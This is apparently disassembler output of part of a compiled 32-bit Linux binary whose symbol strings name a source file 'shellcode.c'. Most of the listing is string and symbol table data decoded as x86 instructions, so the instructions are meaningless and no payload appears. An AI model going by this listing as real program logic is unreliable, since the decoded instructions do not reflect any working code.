00000000  7F45              jg 0x47
00001E15  840408            test [eax+ecx],al
00001E18  61                popad
00001E19  0000              add [eax],al
00001E1B  0012              add [edx],dl
00001E1D  000D00C30100      add [dword 0x1c300],cl
00001E23  0094A004080000    add [eax+0x804],dl
00001E2A  0000              add [eax],al
00001E2C  1000              adc [eax],al
00001E2E  F1                int1
00001E2F  FFC8              dec eax
00001E31  0100              add [eax],eax
00001E33  0030              add [eax],dh
00001E35  83040800          add dword [eax+ecx],byte +0x0
00001E39  0000              add [eax],al
00001E3B  0012              add [edx],dl
00001E3D  000D00CF0100      add [dword 0x1cf00],cl
00001E43  0008              add [eax],cl
00001E45  850408            test [eax+ecx],eax
00001E48  0400              add al,0x0
00001E4A  0000              add [eax],al
00001E4C  1100              adc [eax],eax
00001E4E  0F00D6            lldt si
00001E51  0100              add [eax],eax
00001E53  008CA004080000    add [eax+0x804],cl
00001E5A  0000              add [eax],al
00001E5C  1000              adc [eax],al
00001E5E  F1                int1
00001E5F  FFE2              jmp edx
00001E61  0100              add [eax],eax
00001E63  00E4              add ah,ah
00001E65  83040851          add dword [eax+ecx],byte +0x51
00001E69  0000              add [eax],al
00001E6B  0012              add [edx],dl
00001E6D  000D00E70100      add [dword 0x1e700],cl
00001E73  0000              add [eax],al
00001E75  0000              add [eax],al
00001E77  0000              add [eax],al
00001E79  0000              add [eax],al
00001E7B  0020              add [eax],ah
00001E7D  0000              add [eax],al
00001E7F  00FB              add bl,bh
00001E81  0100              add [eax],eax
00001E83  00B48204080000    add [edx+eax*4+0x804],dh
00001E8A  0000              add [eax],al
00001E8C  1200              adc al,[eax]
00001E8E  0B00              or eax,[eax]
00001E90  0102              add [edx],eax
00001E92  0000              add [eax],al
00001E94  40                inc eax
00001E95  A004084A00        mov al,[0x4a0804]
00001E9A  0000              add [eax],al
00001E9C  1100              adc [eax],eax
00001E9E  1800              sbb [eax],al
00001EA0  006372            add [ebx+0x72],ah
00001EA3  7473              jz 0x1f18
00001EA5  7475              jz 0x1f1c
00001EA7  66662E6300        o16 arpl [cs:eax],ax
00001EAC  5F                pop edi
00001EAD  5F                pop edi
00001EAE  43                inc ebx
00001EAF  54                push esp
00001EB0  4F                dec edi
00001EB1  52                push edx
00001EB2  5F                pop edi
00001EB3  4C                dec esp
00001EB4  49                dec ecx
00001EB5  53                push ebx
00001EB6  54                push esp
00001EB7  5F                pop edi
00001EB8  5F                pop edi
00001EB9  005F5F            add [edi+0x5f],bl
00001EBC  44                inc esp
00001EBD  54                push esp
00001EBE  4F                dec edi
00001EBF  52                push edx
00001EC0  5F                pop edi
00001EC1  4C                dec esp
00001EC2  49                dec ecx
00001EC3  53                push ebx
00001EC4  54                push esp
00001EC5  5F                pop edi
00001EC6  5F                pop edi
00001EC7  005F5F            add [edi+0x5f],bl
00001ECA  4A                dec edx
00001ECB  43                inc ebx
00001ECC  52                push edx
00001ECD  5F                pop edi
00001ECE  4C                dec esp
00001ECF  49                dec ecx
00001ED0  53                push ebx
00001ED1  54                push esp
00001ED2  5F                pop edi
00001ED3  5F                pop edi
00001ED4  005F5F            add [edi+0x5f],bl
00001ED7  646F              fs outsd
00001ED9  5F                pop edi
00001EDA  676C              a16 insb
00001EDC  6F                outsd
00001EDD  62616C            bound esp,[ecx+0x6c]
00001EE0  5F                pop edi
00001EE1  64746F            fs jz 0x1f53
00001EE4  7273              jc 0x1f59
00001EE6  5F                pop edi
00001EE7  61                popad
00001EE8  7578              jnz 0x1f62
00001EEA  00636F            add [ebx+0x6f],ah
00001EED  6D                insd
00001EEE  706C              jo 0x1f5c
00001EF0  657465            gs jz 0x1f58
00001EF3  642E363135390064  xor [dword ss:0x74640039],esi
         -74
00001EFC  6F                outsd
00001EFD  725F              jc 0x1f5e
00001EFF  6964782E36313631  imul esp,[eax+edi*2+0x2e],dword 0x31363136
00001F07  006672            add [esi+0x72],ah
00001F0A  61                popad
00001F0B  6D                insd
00001F0C  655F              gs pop edi
00001F0E  64756D            fs jnz 0x1f7e
00001F11  6D                insd
00001F12  7900              jns 0x1f14
00001F14  5F                pop edi
00001F15  5F                pop edi
00001F16  43                inc ebx
00001F17  54                push esp
00001F18  4F                dec edi
00001F19  52                push edx
00001F1A  5F                pop edi
00001F1B  45                inc ebp
00001F1C  4E                dec esi
00001F1D  44                inc esp
00001F1E  5F                pop edi
00001F1F  5F                pop edi
00001F20  005F5F            add [edi+0x5f],bl
00001F23  46                inc esi
00001F24  52                push edx
00001F25  41                inc ecx
00001F26  4D                dec ebp
00001F27  45                inc ebp
00001F28  5F                pop edi
00001F29  45                inc ebp
00001F2A  4E                dec esi
00001F2B  44                inc esp
00001F2C  5F                pop edi
00001F2D  5F                pop edi
00001F2E  005F5F            add [edi+0x5f],bl
00001F31  4A                dec edx
00001F32  43                inc ebx
00001F33  52                push edx
00001F34  5F                pop edi
00001F35  45                inc ebp
00001F36  4E                dec esi
00001F37  44                inc esp
00001F38  5F                pop edi
00001F39  5F                pop edi
00001F3A  005F5F            add [edi+0x5f],bl
00001F3D  646F              fs outsd
00001F3F  5F                pop edi
00001F40  676C              a16 insb
00001F42  6F                outsd
00001F43  62616C            bound esp,[ecx+0x6c]
00001F46  5F                pop edi
00001F47  63746F72          arpl [edi+ebp*2+0x72],si
00001F4B  735F              jnc 0x1fac
00001F4D  61                popad
00001F4E  7578              jnz 0x1fc8
00001F50  007368            add [ebx+0x68],dh
00001F53  656C              gs insb
00001F55  6C                insb
00001F56  636F64            arpl [edi+0x64],bp
00001F59  652E6300          arpl [cs:eax],ax
00001F5D  5F                pop edi
00001F5E  5F                pop edi
00001F5F  696E69745F6172    imul ebp,[esi+0x69],dword 0x72615f74
00001F66  7261              jc 0x1fc9
00001F68  795F              jns 0x1fc9
00001F6A  656E              gs outsb
00001F6C  64005F44          add [fs:edi+0x44],bl
00001F70  59                pop ecx
00001F71  4E                dec esi
00001F72  41                inc ecx
00001F73  4D                dec ebp
00001F74  49                dec ecx
00001F75  43                inc ebx
00001F76  005F5F            add [edi+0x5f],bl
00001F79  696E69745F6172    imul ebp,[esi+0x69],dword 0x72615f74
00001F80  7261              jc 0x1fe3
00001F82  795F              jns 0x1fe3
00001F84  7374              jnc 0x1ffa
00001F86  61                popad
00001F87  7274              jc 0x1ffd
00001F89  005F47            add [edi+0x47],bl
00001F8C  4C                dec esp
00001F8D  4F                dec edi
00001F8E  42                inc edx
00001F8F  41                inc ecx
00001F90  4C                dec esp
00001F91  5F                pop edi
00001F92  4F                dec edi
00001F93  46                inc esi
00001F94  46                inc esi
00001F95  53                push ebx
00001F96  45                inc ebp
00001F97  54                push esp
00001F98  5F                pop edi
00001F99  54                push esp
00001F9A  41                inc ecx
00001F9B  42                inc edx
00001F9C  4C                dec esp
00001F9D  45                inc ebp
00001F9E  5F                pop edi
00001F9F  005F5F            add [edi+0x5f],bl
00001FA2  6C                insb
00001FA3  6962635F637375    imul esp,[edx+0x63],dword 0x7573635f
00001FAA  5F                pop edi
00001FAB  66696E69005F      imul bp,[esi+0x69],word 0x5f00
00001FB1  5F                pop edi
00001FB2  693638362E67      imul esi,[esi],dword 0x672e3638
00001FB8  65745F            gs jz 0x201a
00001FBB  7063              jo 0x2020
00001FBD  5F                pop edi
00001FBE  7468              jz 0x2028
00001FC0  756E              jnz 0x2030
00001FC2  6B2E62            imul ebp,[esi],byte +0x62
00001FC5  7800              js 0x1fc7
00001FC7  6461              fs popad
00001FC9  7461              jz 0x202c
00001FCB  5F                pop edi
00001FCC  7374              jnc 0x2042
00001FCE  61                popad
00001FCF  7274              jc 0x2045
00001FD1  007072            add [eax+0x72],dh
00001FD4  696E7466404047    imul ebp,[esi+0x74],dword 0x47404066
00001FDB  4C                dec esp
00001FDC  49                dec ecx
00001FDD  42                inc edx
00001FDE  43                inc ebx
00001FDF  5F                pop edi
00001FE0  322E              xor ch,[esi]
00001FE2  3000              xor [eax],al
00001FE4  5F                pop edi
00001FE5  656461            fs popad
00001FE8  7461              jz 0x204b
00001FEA  005F66            add [edi+0x66],bl
00001FED  696E69005F5F44    imul ebp,[esi+0x69],dword 0x445f5f00
00001FF4  54                push esp
00001FF5  4F                dec edi
00001FF6  52                push edx
00001FF7  5F                pop edi
00001FF8  45                inc ebp
00001FF9  4E                dec esi
00001FFA  44                inc esp
00001FFB  5F                pop edi
00001FFC  5F                pop edi
00001FFD  005F5F            add [edi+0x5f],bl
00002000  6461              fs popad
00002002  7461              jz 0x2065
00002004  5F                pop edi
00002005  7374              jnc 0x207b
00002007  61                popad
00002008  7274              jc 0x207e
0000200A  005F5F            add [edi+0x5f],bl
0000200D  676D              a16 insd
0000200F  6F                outsd
00002010  6E                outsb
00002011  5F                pop edi
00002012  7374              jnc 0x2088
00002014  61                popad
00002015  7274              jc 0x208b
00002017  5F                pop edi
00002018  5F                pop edi
00002019  005F5F            add [edi+0x5f],bl
0000201C  64736F            fs jnc 0x208e
0000201F  5F                pop edi
00002020  68616E646C        push dword 0x6c646e61
00002025  65005F49          add [gs:edi+0x49],bl
00002029  4F                dec edi
0000202A  5F                pop edi
0000202B  7374              jnc 0x20a1
0000202D  64696E5F75736564  imul ebp,[fs:esi+0x5f],dword 0x64657375
00002035  005F5F            add [edi+0x5f],bl
00002038  6C                insb
00002039  6962635F737461    imul esp,[edx+0x63],dword 0x6174735f
00002040  7274              jc 0x20b6
00002042  5F                pop edi
00002043  6D                insd
00002044  61                popad
00002045  696E4040474C49    imul ebp,[esi+0x40],dword 0x494c4740
0000204C  42                inc edx
0000204D  43                inc ebx
0000204E  5F                pop edi
0000204F  322E              xor ch,[esi]
00002051  3000              xor [eax],al
00002053  5F                pop edi
00002054  5F                pop edi
00002055  6C                insb
00002056  6962635F637375    imul esp,[edx+0x63],dword 0x7573635f
0000205D  5F                pop edi
0000205E  696E6974005F65    imul ebp,[esi+0x69],dword 0x655f0074
00002065  6E                outsb
00002066  64005F73          add [fs:edi+0x73],bl
0000206A  7461              jz 0x20cd
0000206C  7274              jc 0x20e2
0000206E  005F66            add [edi+0x66],bl
00002071  705F              jo 0x20d2
00002073  6877005F5F        push dword 0x5f5f0077
00002078  627373            bound esi,[ebx+0x73]
0000207B  5F                pop edi
0000207C  7374              jnc 0x20f2
0000207E  61                popad
0000207F  7274              jc 0x20f5
00002081  006D61            add [ebp+0x61],ch
00002084  696E005F4A765F    imul ebp,[esi+0x0],dword 0x5f764a5f
0000208B  52                push edx
0000208C  6567697374657243  imul esi,[gs:bp+di+0x74],dword 0x6c437265
         -6C
00002095  61                popad
00002096  7373              jnc 0x210b
00002098  657300            gs jnc 0x209b
0000209B  5F                pop edi
0000209C  696E697400636F    imul ebp,[esi+0x69],dword 0x6f630074
000020A3  64                fs
000020A4  65                gs
000020A5  00                db 0x00
